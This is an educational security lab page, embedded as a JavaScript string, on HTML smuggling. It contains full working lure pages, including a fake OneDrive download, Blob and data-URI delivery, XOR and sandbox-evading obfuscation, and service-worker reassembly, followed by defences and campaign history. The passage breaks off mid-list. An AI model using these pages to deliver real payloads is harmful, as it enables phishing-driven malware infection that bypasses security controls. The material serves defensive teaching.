window.LESSONS = window.LESSONS || {};
window.LESSONS.smuggling = `

<h1 class="lesson-title">Lab 16: HTML Smuggling</h1>

<p class="lesson-subtitle">
  You are about to learn one of the most elegant evasion techniques in a modern attacker's toolkit.
  HTML smuggling does not exploit a vulnerability in your application. It does not require a zero-day.
  It does not even require the malicious payload to traverse your network. Instead, the attacker sends
  a perfectly benign HTML page — something your email gateway, web proxy, sandbox, and DLP system all
  inspect and approve — and that HTML page quietly assembles a malicious binary inside the victim's
  browser using nothing but JavaScript. The payload is constructed client-side from encoded data
  embedded in the page. It never crosses the wire as a recognizable file. Your network security stack
  never sees it. And yet a fully functional executable, ISO image, or ZIP archive materializes in the
  victim's Downloads folder. This is HTML smuggling, and it has become one of the most popular delivery
  mechanisms for advanced persistent threat groups since 2021.
</p>

<hr>

<h2 class="step"><span class="step-label">Step 1</span> What HTML Smuggling Is</h2>

<p>
  Let me walk you through the core concept. Traditional malware delivery works like this: the attacker
  attaches a malicious file to an email or hosts it on a server. The victim clicks a link or opens the
  attachment. Network security devices — email gateways, web proxies, intrusion detection systems,
  sandboxes — inspect the file as it flows through the network. If the file matches known signatures
  or exhibits suspicious behavior in a sandbox, it gets blocked. This model has worked reasonably
  well for decades.
</p>

<p>
  HTML smuggling breaks this model entirely. Instead of sending the malicious file through the network,
  the attacker sends an HTML page containing JavaScript code and encoded payload data. Here is what
  happens step by step:
</p>

<ol>
  <li>The attacker crafts an HTML page that looks harmless. It might appear to be a SharePoint login,
  a OneDrive download page, or a DocuSign document. The HTML itself contains no executable files.</li>
  <li>The HTML page contains JavaScript code and a blob of encoded data — typically Base64-encoded
  binary content. To any scanner, this looks like a normal web page with some JavaScript and a long
  string constant.</li>
  <li>When the victim opens the HTML page in their browser, the JavaScript executes. It decodes the
  embedded data back into raw binary bytes.</li>
  <li>The JavaScript constructs a file object in memory using the Blob API or similar mechanisms.</li>
  <li>The JavaScript triggers an automatic download of this file, or presents it as a link the user
  can click.</li>
  <li>The malicious binary — an EXE, ISO, ZIP, or whatever the attacker chose — now exists on the
  victim's local filesystem. It was never transmitted as a file over the network. It was assembled
  entirely inside the browser.</li>
</ol>

<div class="callout warn">
  <div class="callout-title">Why This Matters</div>
  <div class="callout-text">
    Network-based security controls — email attachment scanners, web proxy content filters, SSL
    inspection appliances, sandboxes, DLP systems — inspect content as it flows through the
    network. HTML smuggling ensures the malicious content never flows through the network as a
    recognizable file. The network only sees HTML and JavaScript, both of which are completely
    normal web traffic. The actual malware is assembled after it has passed all network inspection
    points, inside the browser on the endpoint.
  </div>
</div>

<p>
  Think of it like mailing someone the instructions to build a weapon rather than mailing the weapon
  itself. The postal inspector opens the package, sees paper with writing on it, and lets it through.
  The recipient follows the instructions and builds the weapon locally. The weapon never went through
  the mail.
</p>

<p>
  This is not theoretical. This technique has been used by Nobelium (the group behind the SolarWinds
  compromise), Qakbot campaigns, and numerous other threat actors in real attacks against enterprises,
  governments, and critical infrastructure.
</p>

<hr>

<h2 class="step"><span class="step-label">Step 2</span> Scenario 1 — Blob-Based File Construction</h2>

<p>
  The most common HTML smuggling technique uses the JavaScript Blob API to construct a file in the
  browser. The Blob API is a legitimate web platform feature — it is used by countless web applications
  to generate files for download, create thumbnails, process images, and handle binary data. There is
  nothing inherently malicious about it. Attackers exploit its legitimacy.
</p>

<p>
  Here is how it works. The attacker embeds a Base64-encoded payload inside the HTML page as a
  JavaScript string. When the page loads, JavaScript decodes that string into a Uint8Array (raw
  binary bytes), wraps it in a Blob object, creates an Object URL pointing to the Blob, and triggers
  a download. Let me show you the complete attack page. For safety, the demo payload here is a simple
  text file, not an actual executable.
</p>

<div class="attack-box">
  <div class="attack-title">Attack: Blob-Based HTML Smuggling Page</div>
  <pre>
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;Document Processing - Secure Download&lt;/title&gt;
  &lt;style&gt;
    body {
      font-family: 'Segoe UI', Tahoma, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background: #f3f3f3;
    }
    .container {
      text-align: center;
      background: white;
      padding: 40px;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
    }
    .spinner {
      border: 4px solid #e0e0e0;
      border-top: 4px solid #0078d4;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
  &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
  &lt;div class="container"&gt;
    &lt;img src="https://example.com/logo.png" alt="Logo"&gt;
    &lt;h2&gt;Your document is being prepared...&lt;/h2&gt;
    &lt;div class="spinner"&gt;&lt;/div&gt;
    &lt;p&gt;Download will begin automatically.&lt;/p&gt;
  &lt;/div&gt;

  &lt;script&gt;
    // The payload is Base64-encoded and embedded directly
    // In a real attack, this would be an EXE, ISO, or ZIP
    // Here we use a harmless text file for demonstration
    var encodedPayload =
      "VGhpcyBpcyBhIGhhcm1sZXNzIGRlbW8gZmlsZS4=";

    // Decode Base64 to binary
    var decoded = atob(encodedPayload);

    // Convert to byte array
    var bytes = new Uint8Array(decoded.length);
    for (var i = 0; i &lt; decoded.length; i++) {
      bytes[i] = decoded.charCodeAt(i);
    }

    // Create a Blob from the byte array
    var blob = new Blob([bytes], {
      type: "application/octet-stream"
    });

    // Create an Object URL for the Blob
    var url = URL.createObjectURL(blob);

    // Create an anchor element and trigger download
    var a = document.createElement("a");
    a.href = url;
    a.download = "Q3-Financial-Report.pdf";
    document.body.appendChild(a);
    a.click();

    // Clean up
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</pre>
</div>

<p>
  Let me break down what is happening here. The page looks like a legitimate document download page —
  it has a spinner, a professional layout, and reassuring messaging. While the user sees "Your
  document is being prepared," the JavaScript is decoding the embedded data, constructing a file,
  and triggering a download. The file arrives in the user's Downloads folder with a convincing name
  like "Q3-Financial-Report.pdf."
</p>

<p>
  From the network's perspective, all that was transmitted was an HTML page containing JavaScript and
  a Base64 string. No email gateway in the world is going to flag a Base64 string inside a script
  tag as malicious. The HTML page itself contains no executable, no malicious file signature, and no
  known indicators of compromise. The malware only exists after the JavaScript executes in the
  victim's browser.
</p>

<div class="callout info">
  <div class="callout-title">How Base64 Encoding Works Here</div>
  <div class="callout-text">
    Base64 encodes arbitrary binary data as ASCII text, expanding the data by roughly 33%. A 1 MB
    executable becomes about 1.37 MB of Base64 text. The <code>atob()</code> function decodes the
    Base64 string back to binary. The <code>Uint8Array</code> gives us access to individual bytes.
    The <code>Blob</code> constructor wraps those bytes into a file-like object. And
    <code>URL.createObjectURL()</code> creates a temporary URL that points to the in-memory Blob.
    Every step here uses standard, widely-used browser APIs.
  </div>
</div>

<hr>

<h2 class="step"><span class="step-label">Step 3</span> Scenario 2 — Data URI Download</h2>

<p>
  An alternative delivery mechanism uses data URIs instead of Blob URLs. A data URI embeds the file
  content directly in the URL itself. Combined with the <code>download</code> attribute on an anchor
  tag, this creates another way to deliver smuggled files without ever creating a Blob object.
</p>

<div class="attack-box">
  <div class="attack-title">Attack: Data URI Smuggling</div>
  <pre>
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;Invoice Portal&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
  &lt;h2&gt;Your invoice is ready&lt;/h2&gt;

  &lt;!-- Method 1: Static data URI link --&gt;
  &lt;a
    href="data:application/octet-stream;base64,VGhpcyBpcyBhIGRlbW8u"
    download="Invoice-2024-March.pdf"
  &gt;
    Click here to download your invoice
  &lt;/a&gt;

  &lt;!-- Method 2: JavaScript-generated data URI --&gt;
  &lt;script&gt;
    var payload = "VGhpcyBpcyBhIGRlbW8u";
    var link = document.createElement("a");
    link.href = "data:application/octet-stream;base64,"
      + payload;
    link.download = "Invoice-2024-March.pdf";
    document.body.appendChild(link);

    // Optional: auto-click after a delay
    setTimeout(function() { link.click(); }, 2000);
  &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</pre>
</div>

<p>
  The data URI approach has some differences from the Blob approach worth understanding:
</p>

<ul>
  <li><strong>Size limitations.</strong> Most browsers limit data URIs to around 2 MB, though the
  exact limit varies. Chrome historically supported up to about 2 MB for navigation and downloads.
  Firefox is more generous. Internet Explorer and early Edge had much smaller limits. For large
  payloads (multi-megabyte executables), Blob URLs are more reliable.</li>
  <li><strong>Browser support for download attribute.</strong> The <code>download</code> attribute on
  anchor tags is supported in Chrome, Firefox, Edge, and Safari 14.5+. Without this attribute, the
  browser may try to navigate to the data URI instead of downloading it, which typically results in
  garbled text in the browser window.</li>
  <li><strong>No Object URL creation.</strong> This technique does not call
  <code>URL.createObjectURL()</code>, which means security tools monitoring for Blob URL creation
  will not detect it. The payload is delivered entirely through the anchor tag's href attribute.</li>
  <li><strong>Visibility in HTML source.</strong> The Base64 payload is directly visible in the HTML
  source or in the DOM. Automated scanners that inspect the HTML for suspiciously long Base64 strings
  could potentially flag this, though in practice most do not.</li>
</ul>

<div class="callout warn">
  <div class="callout-title">Chrome Security Changes</div>
  <div class="callout-text">
    Chrome has progressively restricted data URI navigations for security reasons. Top-frame
    navigations to data URIs (typing a data URI in the address bar or redirecting to one) are
    blocked. However, the <code>download</code> attribute on anchor tags still functions for data
    URI downloads. Attackers stay current with browser security changes and adjust their techniques
    accordingly. Always test your defenses against current browser behavior.
  </div>
</div>

<hr>

<h2 class="step"><span class="step-label">Step 4</span> Scenario 3 — Anchor Tag Auto-Download with Click Simulation</h2>

<p>
  This is the most socially engineered variant. The attacker creates a highly convincing page — styled
  to look like Microsoft OneDrive, Google Drive, SharePoint, or DocuSign — and the download happens
  automatically without any visible user interaction. The victim opens the HTML file (perhaps received
  as an email attachment or accessed via a link), sees what looks like a legitimate download portal,
  and a file appears in their Downloads folder before they even decide to click anything.
</p>

<div class="attack-box">
  <div class="attack-title">Attack: Social Engineering + Auto-Download</div>
  <pre>
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;OneDrive - Sign In Required&lt;/title&gt;
  &lt;style&gt;
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #f5f5f5;
    }
    .header {
      background: #0078d4;
      color: white;
      padding: 12px 24px;
      font-size: 18px;
    }
    .content {
      max-width: 600px;
      margin: 60px auto;
      background: white;
      padding: 40px;
      border-radius: 4px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.15);
    }
    .file-icon { font-size: 48px; margin-bottom: 16px; }
    .filename {
      font-weight: 600;
      font-size: 18px;
      margin-bottom: 8px;
    }
    .filesize { color: #666; margin-bottom: 24px; }
    .download-btn {
      background: #0078d4;
      color: white;
      border: none;
      padding: 12px 32px;
      font-size: 16px;
      border-radius: 4px;
      cursor: pointer;
    }
    .progress {
      margin-top: 24px;
      display: none;
    }
    .progress-bar {
      background: #e0e0e0;
      border-radius: 4px;
      overflow: hidden;
      height: 8px;
    }
    .progress-fill {
      background: #0078d4;
      height: 100%;
      width: 0%;
      transition: width 1.5s ease;
    }
  &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
  &lt;div class="header"&gt;OneDrive&lt;/div&gt;
  &lt;div class="content"&gt;
    &lt;div class="file-icon"&gt;&#128196;&lt;/div&gt;
    &lt;div class="filename"&gt;
      Project-Proposal-Final.docx
    &lt;/div&gt;
    &lt;div class="filesize"&gt;2.4 MB&lt;/div&gt;
    &lt;button class="download-btn" id="dlBtn"&gt;
      Download
    &lt;/button&gt;
    &lt;div class="progress" id="prog"&gt;
      &lt;div class="progress-bar"&gt;
        &lt;div class="progress-fill" id="fill"&gt;&lt;/div&gt;
      &lt;/div&gt;
      &lt;p style="margin-top:8px; color:#666"&gt;
        Preparing download...
      &lt;/p&gt;
    &lt;/div&gt;
  &lt;/div&gt;

  &lt;script&gt;
    // Base64-encoded payload (harmless demo)
    var data =
      "VGhpcyBpcyBhIGhhcm1sZXNzIGRlbW8gZmlsZS4=";

    function deliver() {
      // Show fake progress bar
      var prog = document.getElementById("prog");
      var fill = document.getElementById("fill");
      prog.style.display = "block";
      fill.style.width = "100%";

      setTimeout(function() {
        // Decode and construct
        var raw = atob(data);
        var arr = new Uint8Array(raw.length);
        for (var i = 0; i &lt; raw.length; i++) {
          arr[i] = raw.charCodeAt(i);
        }

        var blob = new Blob([arr], {
          type: "application/octet-stream"
        });
        var url = URL.createObjectURL(blob);

        // Create hidden anchor and click it
        var a = document.createElement("a");
        a.style.display = "none";
        a.href = url;
        a.download = "Project-Proposal-Final.docx";
        document.body.appendChild(a);
        a.click();

        // Cleanup
        URL.revokeObjectURL(url);
        document.body.removeChild(a);
      }, 1500);
    }

    // Auto-trigger on page load
    window.onload = function() {
      deliver();
    };

    // Also trigger on button click for users
    // who have download prompts enabled
    document.getElementById("dlBtn")
      .addEventListener("click", deliver);
  &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</pre>
</div>

<p>
  Notice several important elements of this attack:
</p>

<ul>
  <li><strong>Visual credibility.</strong> The page is styled to look exactly like a OneDrive sharing
  page. The victim has no visual reason to suspect anything is wrong. The colors, fonts, layout, and
  icons all match the real service.</li>
  <li><strong>Fake progress bar.</strong> The animated progress bar creates a sense of legitimacy.
  Real download pages show progress. This page does too. The victim's mental model — "I'm downloading
  a document from OneDrive" — is reinforced by every visual element.</li>
  <li><strong>Auto-trigger on load.</strong> The <code>window.onload</code> handler triggers the
  download automatically. In browsers with default settings, the file will appear in the Downloads
  folder without any user interaction beyond opening the HTML page.</li>
  <li><strong>Fallback button.</strong> If the browser blocks the auto-download (some browsers
  require a user gesture for programmatic downloads), the visible Download button gives the victim
  a way to manually trigger it. Either way, the attacker wins.</li>
  <li><strong>Convincing filename.</strong> The <code>download</code> attribute sets the filename to
  something the victim expects: "Project-Proposal-Final.docx." The victim is not downloading a
  suspicious executable — they think they are downloading a Word document that a colleague shared.</li>
</ul>

<div class="callout info">
  <div class="callout-title">User Gesture Requirements</div>
  <div class="callout-text">
    Modern browsers increasingly require a user gesture (click, tap, keyboard interaction) before
    allowing programmatic downloads. Chrome introduced this restriction to combat drive-by
    downloads. However, when the HTML page is opened as a local file (file:// protocol) — as is
    common when delivered as an email attachment — these restrictions may be relaxed. Additionally,
    the page includes a visible download button as a fallback, ensuring the attack succeeds even
    when auto-download is blocked.
  </div>
</div>

<hr>

<h2 class="step"><span class="step-label">Step 5</span> Scenario 4 — XOR/Encoding Obfuscation</h2>

<p>
  The attacks shown so far have a weakness: the Base64-encoded payload sits in the HTML source as a
  long, easily identifiable string. A security tool that scans HTML files for suspicious Base64 blobs
  could flag it. Sophisticated attackers address this by obfuscating the payload data so that it does
  not look like Base64 in the source and cannot be easily decoded by static analysis.
</p>

<p>
  The most common obfuscation technique is XOR encoding. The attacker XOR-encodes the payload with a
  key before embedding it, and the JavaScript decodes it at runtime by XOR-ing with the same key. The
  encoded data looks like random characters — not recognizable as Base64 or any standard encoding.
</p>

<div class="attack-box">
  <div class="attack-title">Attack: XOR-Obfuscated Payload</div>
  <pre>
&lt;script&gt;
  // XOR-encoded payload data (not recognizable
  // as Base64 or any standard encoding)
  var _0xd = [
    0x17, 0x2b, 0x2c, 0x10, 0x45, 0x2c, 0x10, 0x45,
    0x26, 0x45, 0x2b, 0x26, 0x13, 0x28, 0x2f, 0x22,
    0x10, 0x10, 0x45, 0x21, 0x22, 0x28, 0x2a, 0x45
  ];

  // XOR key — looks like an innocent config value
  var _0xk = 0x45;

  // Decode at runtime
  var _0xr = new Uint8Array(_0xd.length);
  for (var _0xi = 0; _0xi &lt; _0xd.length; _0xi++) {
    _0xr[_0xi] = _0xd[_0xi] ^ _0xk;
  }

  // Construct and deliver
  var _0xb = new Blob([_0xr], {
    type: "application/octet-stream"
  });
  var _0xu = URL.createObjectURL(_0xb);
  var _0xa = document.createElement("a");
  _0xa.href = _0xu;
  _0xa.download = "Report.pdf";
  _0xa.click();
&lt;/script&gt;</pre>
</div>

<p>
  But XOR is just the beginning. Attackers use multiple layers of obfuscation to make the HTML file
  as hard to analyze as possible:
</p>

<div class="attack-box">
  <div class="attack-title">Attack: Multi-Layer Obfuscation</div>
  <pre>
&lt;script&gt;
  // Layer 1: String splitting
  // The payload is split across multiple variables
  var p1 = "VGhpcy";
  var p2 = "BpcyBh";
  var p3 = "IGRlbW8u";

  // Layer 2: Array-based reassembly
  var chunks = [p1, p2, p3];
  var encoded = chunks.join("");

  // Layer 3: Character-code transformation
  // Add misdirection with benign-looking functions
  function processDocument(config) {
    var result = [];
    var raw = atob(config.data);
    for (var idx = 0; idx &lt; raw.length; idx++) {
      result.push(raw.charCodeAt(idx));
    }
    return new Uint8Array(result);
  }

  // Layer 4: Delayed execution via setTimeout
  // Evades sandboxes that only run for a few seconds
  setTimeout(function() {
    var bytes = processDocument({ data: encoded });
    var container = new Blob(
      [bytes],
      { type: "application/octet-stream" }
    );
    var ref = URL.createObjectURL(container);
    var el = document.createElement("a");
    el.href = ref;
    el.download = "Statement-March.xlsx";
    el.click();
  }, 5000); // Wait 5 seconds — outlast sandbox
&lt;/script&gt;</pre>
</div>

<p>
  Let me highlight the techniques used here:
</p>

<ul>
  <li><strong>String splitting.</strong> The Base64 payload is split across multiple variables. No
  single string looks suspiciously long. A scanner looking for long Base64 strings will not find
  one.</li>
  <li><strong>Benign variable names.</strong> The function is called <code>processDocument</code>
  with a parameter called <code>config</code>. The variable names <code>result</code>,
  <code>container</code>, <code>ref</code>, and <code>el</code> all look like normal web application
  code. There is nothing that screams "malware dropper."</li>
  <li><strong>Delayed execution.</strong> The <code>setTimeout</code> with a 5-second delay is
  specifically designed to outlast automated sandboxes. Many sandboxes execute JavaScript for only
  a few seconds before rendering a verdict. If the malicious behavior does not trigger during that
  window, the sandbox reports the file as clean.</li>
  <li><strong>Indirect construction.</strong> The payload assembly is wrapped in a function that
  takes a configuration object. This pattern is common in legitimate JavaScript. The flow from
  encoded data to binary to Blob to download is spread across enough indirection to avoid
  signature-based detection.</li>
</ul>

<div class="callout warn">
  <div class="callout-title">Real-World Obfuscation Goes Further</div>
  <div class="callout-text">
    Production HTML smuggling samples from APT groups use JavaScript obfuscation tools like
    <code>javascript-obfuscator</code>, custom encoding schemes, environmental checks (detecting
    sandbox indicators like specific screen resolutions or missing plugins), anti-debugging
    techniques (detecting DevTools), and even WebAssembly for the decoding logic. The examples
    here are simplified for learning, but real campaigns are significantly more evasive.
  </div>
</div>

<hr>

<h2 class="step"><span class="step-label">Step 6</span> Scenario 5 — Smuggling via Service Worker</h2>

<p>
  This is the most advanced variant. A service worker is a JavaScript file that runs in the
  background, separate from the web page, and can intercept network requests. Service workers are
  the foundation of progressive web apps — they enable offline functionality, background sync, and
  push notifications. But in the hands of an attacker, they become a powerful smuggling mechanism.
</p>

<p>
  Here is the attack flow: the attacker's page registers a service worker. That service worker
  intercepts subsequent network requests and responds with smuggled content. The payload can be
  split across multiple requests, each containing only a small fragment that looks benign. The
  service worker reassembles the fragments and serves the complete malicious file.
</p>

<div class="attack-box">
  <div class="attack-title">Attack: Service Worker Smuggling (Main Page)</div>
  <pre>
&lt;script&gt;
  // Register a malicious service worker
  if ("serviceWorker" in navigator) {
    navigator.serviceWorker
      .register("/sw-handler.js")
      .then(function(reg) {
        console.log("SW registered");

        // Once active, fetch the "document"
        // The SW will intercept this and serve
        // the smuggled payload instead
        return navigator.serviceWorker.ready;
      })
      .then(function() {
        // This request is intercepted by the SW
        // which returns the assembled payload
        window.location = "/download/report.pdf";
      });
  }
&lt;/script&gt;</pre>
</div>

<div class="attack-box">
  <div class="attack-title">Attack: Service Worker (sw-handler.js)</div>
  <pre>
self.addEventListener("fetch", function(event) {
  var url = new URL(event.request.url);

  if (url.pathname.startsWith("/download/")) {
    // Intercept the download request
    // Assemble payload from stored chunks
    event.respondWith(
      assemblePayload().then(function(bytes) {
        return new Response(new Blob([bytes]), {
          headers: {
            "Content-Type":
              "application/octet-stream",
            "Content-Disposition":
              "attachment; filename=report.pdf"
          }
        });
      })
    );
  }
});

async function assemblePayload() {
  // Fetch multiple small, benign-looking chunks
  // Each chunk alone looks harmless
  var chunks = [
    "/api/config/theme.json",
    "/api/config/locale.json",
    "/api/config/layout.json"
  ];

  var parts = [];
  for (var c of chunks) {
    var resp = await fetch(c);
    var data = await resp.arrayBuffer();
    parts.push(new Uint8Array(data));
  }

  // Combine and XOR-decode the chunks
  var total = parts.reduce(
    function(s, p) { return s + p.length; }, 0
  );
  var result = new Uint8Array(total);
  var offset = 0;
  for (var p of parts) {
    result.set(p, offset);
    offset += p.length;
  }

  // XOR decode with key
  var key = 0x42;
  for (var i = 0; i &lt; result.length; i++) {
    result[i] = result[i] ^ key;
  }

  return result;
}</pre>
</div>

<p>
  This variant is particularly dangerous for several reasons:
</p>

<ul>
  <li><strong>Fragmented delivery.</strong> The payload data arrives across multiple HTTP requests,
  each disguised as a normal API call to load "configuration" files. No single request contains a
  complete payload. Network inspection tools see multiple small JSON fetches — completely normal
  web traffic.</li>
  <li><strong>Persistence.</strong> Service workers persist even after the page is closed. If the
  attacker can get a service worker registered (through XSS, a compromised CDN, or a malicious
  site), it continues to intercept requests and can serve smuggled content on future visits.</li>
  <li><strong>Invisible interception.</strong> The service worker intercepts the request before it
  reaches the network. From the page's perspective, it made a normal fetch request and got a normal
  response. The smuggling happens entirely within the service worker layer, invisible to both the
  network and the page itself.</li>
  <li><strong>HTTPS requirement.</strong> Service workers require HTTPS (except on localhost), which
  means the attacker needs control over a legitimate HTTPS origin. However, compromised sites,
  subdomain takeovers, and cloud-hosted pages all provide this.</li>
</ul>

<div class="callout info">
  <div class="callout-title">Scope of Service Worker Attacks</div>
  <div class="callout-text">
    A service worker can only intercept requests within its registered scope. If registered at
    <code>/app/</code>, it can only intercept requests to <code>/app/*</code>. Registering at the
    root (<code>/</code>) gives it control over all requests to that origin. This is why strict
    CSP and service worker policies matter — an attacker who can register a root-scope service
    worker effectively controls all network responses the browser receives from that origin.
  </div>
</div>

<hr>

<h2 class="step"><span class="step-label">Step 7</span> Fix — Defending Against HTML Smuggling</h2>

<p>
  HTML smuggling is difficult to defend against precisely because it exploits legitimate browser
  features and normal web traffic patterns. There is no single silver bullet. Defense requires
  layers — controls at the network perimeter, the email gateway, the browser policy level, and
  the endpoint. Let me walk through each layer.
</p>

<div class="fix-box">
  <div class="fix-title">Fix: Content Security Policy (CSP)</div>
  <p>
    A strict CSP is your first line of defense. HTML smuggling requires inline JavaScript to
    execute in the browser. If your CSP blocks inline scripts, the smuggling page cannot run its
    assembly code.
  </p>
  <div class="code-block">
    <div class="code-header">
      <span class="code-file">HTTP Response Header</span>
      <button class="code-copy">Copy</button>
    </div>
    <pre>
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-randomvalue';
  object-src 'none';
  worker-src 'self';
  child-src 'self';</pre>
  </div>
  <p>
    Key directives for anti-smuggling:
  </p>
  <ul>
    <li><code>script-src 'self'</code> or <code>script-src 'nonce-...'</code> — blocks inline
    scripts, which are required for most HTML smuggling attacks.</li>
    <li><code>worker-src 'self'</code> — restricts which origins can register service workers,
    preventing the service worker smuggling variant.</li>
    <li><code>object-src 'none'</code> — blocks plugins and embedded objects that could be used
    as alternative delivery mechanisms.</li>
  </ul>
  <p>
    However, CSP only helps for pages served from your origin. If the attacker sends the HTML
    page as an email attachment opened locally (file:// protocol), no CSP applies. CSP is a
    server-delivered header. Local files do not have a server.
  </p>
</div>

<div class="fix-box">
  <div class="fix-title">Fix: Restrict Blob URL and Object URL Creation</div>
  <p>
    You can restrict JavaScript's ability to create Blob URLs at the browser policy level. In
    enterprise environments, use Group Policy Objects or MDM profiles to limit browser capabilities.
  </p>
  <div class="code-block">
    <div class="code-header">
      <span class="code-file">application-policy.js</span>
      <button class="code-copy">Copy</button>
    </div>
    <pre>
// Application-level: Override URL.createObjectURL
// to log or block suspicious usage
(function() {
  var original = URL.createObjectURL;

  URL.createObjectURL = function(blob) {
    // Log the creation for monitoring
    console.warn(
      "Blob URL created:",
      blob.type,
      blob.size,
      "bytes"
    );

    // Block suspicious MIME types
    var blocked = [
      "application/x-msdownload",
      "application/x-msdos-program",
      "application/x-iso9660-image",
      "application/vnd.microsoft.portable-executable"
    ];

    if (blocked.includes(blob.type)) {
      console.error(
        "Blocked Blob URL for type:", blob.type
      );
      throw new Error("Blocked by security policy");
    }

    return original.call(URL, blob);
  };
})();</pre>
  </div>
  <p>
    This approach has limits. Attackers can set the Blob type to
    <code>application/octet-stream</code> or even <code>text/plain</code> to bypass MIME type
    checks. But it adds a layer of visibility and can catch unsophisticated attempts.
  </p>
</div>

<div class="fix-box">
  <div class="fix-title">Fix: Email Gateway Hardening</div>
  <p>
    Since HTML smuggling frequently arrives via email, hardening your email gateway is critical:
  </p>
  <ul>
    <li><strong>Strip or quarantine HTML attachments.</strong> Most email gateways can be configured
    to block HTML, HTM, and SVG file attachments. If your business does not require users to receive
    HTML files by email, block them entirely.</li>
    <li><strong>Disable active content in HTML attachments.</strong> Configure the gateway to strip
    <code>&lt;script&gt;</code> tags and event handlers from HTML attachments that are allowed
    through.</li>
    <li><strong>Sandbox rendering.</strong> Advanced email security solutions render HTML attachments
    in a sandbox, execute the JavaScript, and inspect the resulting behavior. If the HTML page
    constructs and downloads a file, the sandbox flags it as suspicious.</li>
    <li><strong>Block password-protected archives.</strong> Attackers often put the HTML smuggling
    page inside a password-protected ZIP to bypass gateway scanning. Block password-protected
    archives at the gateway level.</li>
  </ul>
</div>

<div class="fix-box">
  <div class="fix-title">Fix: Browser and Endpoint Controls</div>
  <div class="code-block">
    <div class="code-header">
      <span class="code-file">Group Policy / MDM Configuration</span>
      <button class="code-copy">Copy</button>
    </div>
    <pre>
// Chrome Enterprise Policy examples:

// Block dangerous file downloads by type
"DownloadRestrictions": 1,

// Restrict file types that can be auto-opened
"AutoOpenFileTypes": [],

// Force download prompts (no silent downloads)
"PromptForDownloadLocation": true,

// Block JavaScript on file:// URLs
"AllowFileAccessFromFileURLs": false,

// Disable service worker registration on
// non-whitelisted origins
// (requires enterprise policy management)</pre>
  </div>
  <p>
    Endpoint detection and response (EDR) solutions can also help. Modern EDR tools monitor for:
  </p>
  <ul>
    <li>Browser processes creating suspicious files in the Downloads folder</li>
    <li>Executable files written by browser processes that originate from Blob URLs</li>
    <li>ISO, IMG, or VHD files created shortly after an HTML file was opened</li>
    <li>Unusual process chains: email client spawns browser, browser writes executable</li>
  </ul>
</div>

<div class="fix-box">
  <div class="fix-title">Fix: Network-Level Deep Content Inspection</div>
  <p>
    Traditional network security inspects file content as it crosses the network. HTML smuggling
    bypasses this because the file is assembled client-side. Advanced solutions address this by
    rendering HTML content before delivery:
  </p>
  <ul>
    <li><strong>Browser isolation.</strong> Remote browser isolation (RBI) solutions render web
    content in a cloud-based browser and stream the visual output to the user. The JavaScript
    executes in the isolated browser, not on the endpoint. Even if the smuggling page constructs
    a file, it is constructed in the isolated environment, not on the user's machine.</li>
    <li><strong>HTML rendering proxies.</strong> Some advanced web proxies render HTML pages,
    execute their JavaScript, and inspect the resulting behavior before delivering the page to the
    user. If the page constructs and downloads a file, the proxy can intercept it.</li>
    <li><strong>Content disarm and reconstruction (CDR).</strong> CDR solutions deconstruct files
    (including HTML pages), remove active content (JavaScript, macros, embedded objects), and
    reconstruct a safe version. An HTML page stripped of all JavaScript cannot perform smuggling.</li>
  </ul>
</div>

<hr>

<h2 class="step"><span class="step-label">Deeper</span> Real-World HTML Smuggling Campaigns</h2>

<p>
  HTML smuggling is not a theoretical exercise. It has been weaponized by some of the most
  sophisticated threat actors in the world. Understanding these real campaigns helps you appreciate
  why your organization needs to defend against this technique.
</p>

<p>
  <strong>Nobelium / Midnight Blizzard (SolarWinds Group).</strong> In 2021, Microsoft Threat
  Intelligence reported that Nobelium — the same threat actor behind the SolarWinds supply chain
  compromise — was using HTML smuggling as a primary delivery mechanism. Their campaign targeted
  government agencies, think tanks, and NGOs. The attack chain worked as follows: the victim received
  a spear-phishing email with an HTML attachment. When opened, the HTML page used JavaScript to
  assemble an ISO file on the victim's machine. The ISO contained a shortcut (LNK) file and a
  malicious DLL. When the victim opened the ISO and clicked the shortcut, the DLL was sideloaded,
  establishing a Cobalt Strike beacon. The entire initial delivery — from email to Cobalt Strike —
  bypassed network security because the ISO file was never transmitted over the network.
</p>

<p>
  <strong>Qakbot / QBot Campaigns.</strong> Qakbot, one of the most prolific banking trojans and
  malware delivery platforms, adopted HTML smuggling extensively in 2022 and 2023. Their campaigns
  sent emails with HTML attachments that constructed password-protected ZIP files in the browser.
  The ZIP contained an ISO file, which contained a LNK file that executed a DLL. The password for
  the ZIP was displayed on the HTML page, so the victim could open the archive. The multi-layer
  packaging — HTML to ZIP to ISO to LNK to DLL — was specifically designed to bypass multiple
  layers of security. Email gateways saw only an HTML file. The ZIP was password-protected so it
  could not be scanned. The ISO bypassed Mark of the Web (MOTW) protections in Windows. Each layer
  addressed a different security control.
</p>

<p>
  <strong>Why APT Groups Love HTML Smuggling.</strong> Since 2021, HTML smuggling has become
  standard tradecraft for advanced persistent threats for several reasons:
</p>

<ul>
  <li><strong>High bypass rate.</strong> Most email gateways and web proxies still cannot detect
  sophisticated HTML smuggling. The HTML file contains no signatures, no known-malicious URLs, and
  no file attachments to scan.</li>
  <li><strong>Low cost.</strong> Creating an HTML smuggling page is trivial. The technique requires
  only basic JavaScript knowledge. Kits and templates are available on criminal forums.</li>
  <li><strong>Flexibility.</strong> The technique can deliver any file type — EXE, DLL, ISO, IMG,
